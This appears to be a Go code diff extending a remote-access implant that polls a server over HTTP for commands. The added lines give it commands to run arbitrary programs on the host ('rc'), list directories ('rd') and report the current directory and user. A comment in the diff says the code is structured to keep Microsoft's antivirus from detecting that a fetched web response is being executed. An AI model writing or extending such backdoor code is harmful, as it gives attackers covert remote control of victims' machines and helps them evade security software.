@@ -12,6 +12,30 @@ import (
 	"uuid"
 )
 
+func readDir(path string) (contents string) {
+	files, _ := os.ReadDir(path)
+
+	for _, file := range files {
+		contents += file.Name()
+		contents += ", "
+	}
+	fmt.Printf(contents)
+	return
+}
+
+func runCommand(path string) (PID string) {
+	//cmdToRun := path
+	//args := nil
+	procAttr := new(os.ProcAttr)
+	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
+	if process, err := os.StartProcess(path, nil, procAttr); err != nil {
+
+	} else {
+		PID = string(process.Pid)
+	}
+	return
+}
+
 func getCurrentDir() (mydir string) {
 	mydir, err := os.Getwd()
 	if err != nil {
@@ -109,16 +133,21 @@ func main() {
 		fmt.Printf(sb + "\n")
 
 		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
-		sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		//sb1 := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
+		sb1 := strings.Split(sb, " ")
 
 		// We are turning this into a switch statement
 		// We need to append the results of these functions to the result string
 		// Then we send it
-		switch sb1 {
-		case "PWD":
+		switch sb1[0] {
+		case "pwd":
 			result = getCurrentDir()
-		case "GCU":
+		case "gcu":
 			result = getCurrentUser()
+		case "rc":
+			result = runCommand(sb1[1])
+		case "rd":
+			result = readDir(sb1[1])
 		}
 
 		toSend := string(result)
